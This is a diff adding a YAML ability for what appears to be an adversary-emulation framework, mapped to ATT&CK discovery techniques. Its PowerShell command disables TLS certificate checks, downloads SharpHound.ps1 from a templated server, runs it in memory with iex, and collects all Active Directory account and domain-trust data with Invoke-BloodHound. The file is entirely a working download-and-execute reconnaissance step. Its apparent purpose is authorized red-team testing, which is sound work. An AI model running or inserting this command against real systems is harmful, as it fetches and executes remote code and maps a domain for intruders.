@@ -1,0 +1,22 @@
+---
+
+- id: 942d91ab-c7bc-4f72-9c47-ec876375c6e4
+  name: Run Bloodhound (SharpHound.ps1)
+  description: >
+    Runs the Bloodhound SharpHound.ps1 data collector script and places output as JSON files in the specified directory.
+  technique:
+    attack_id: T1087,T1482
+    name: Account Discovery,Domain Trust Discovery
+  tactic: discovery
+  platforms:
+    windows:
+      psh:
+        command: |
+          [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+          $url="#{server}/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("file","SharpHound.ps1");
+          iex($wc.DownloadString($url));
+          Invoke-BloodHound -CollectionMethod All -NoSaveCache -NoZip -OutputDirectory #{host.dir.staged};
+          Start-Sleep 10;
+        timeout: 70
